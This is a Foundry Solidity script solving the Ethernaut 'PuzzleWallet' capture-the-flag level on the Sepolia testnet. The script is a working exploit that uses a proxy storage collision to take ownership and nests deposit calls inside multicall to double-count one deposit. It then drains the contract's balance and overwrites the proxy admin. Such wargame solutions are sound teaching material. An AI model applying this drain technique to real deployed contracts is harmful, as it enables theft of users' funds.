// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import {PuzzleWallet, PuzzleProxy} from "@ethernaut/src/levels/PuzzleWallet.sol";

contract AttackPuzzleWallet is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("SEPOLIA_PUZZLEWALLET_CONTRACT");
        address adversary = vm.addr(privateKey);
        PuzzleWallet wallet = PuzzleWallet(payable(instance));
        PuzzleProxy proxy = PuzzleProxy(payable(instance));

        vm.startBroadcast(privateKey);

        proxy.proposeNewAdmin(adversary);
        wallet.addToWhitelist(adversary);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory calls = new bytes[](3);
        calls[0] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
        calls[1] = abi.encodeWithSelector(wallet.deposit.selector);
        calls[2] = abi.encodeWithSelector(wallet.execute.selector, adversary, 0.002 ether, "");

        wallet.multicall{value: 0.001 ether}(calls);

        wallet.setMaxBalance(uint256(uint160(adversary)));

        vm.stopBroadcast();
    }
}
